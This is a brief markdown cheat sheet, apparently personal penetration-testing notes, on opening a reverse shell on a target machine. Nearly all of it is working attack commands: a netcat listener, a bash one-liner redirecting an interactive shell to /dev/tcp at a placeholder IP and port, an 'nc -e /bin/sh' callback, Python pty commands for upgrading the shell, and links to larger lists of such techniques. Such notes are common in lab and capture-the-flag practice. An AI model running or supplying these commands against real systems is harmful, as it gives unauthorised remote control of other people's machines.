### Create a reverse bash shell

- Setup listener on your local machine
`sudo nc -lvn 9898`

- Connect to the listener from the target
-  - `bash -c 'bash -i >& /dev/tcp/your-ip/your-port 0>&1'`
-  - `nc 127.0.0.1 8888 -e /bin/sh`

- Upgrade to a shell (Use the bash when doing this. zsh doesn't seem to work)
-  - `python3 -c 'import pty; pty.spawn("/bin/sh")'`
-  - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
-  - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys


### A long list of ways to create a reverse shell
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
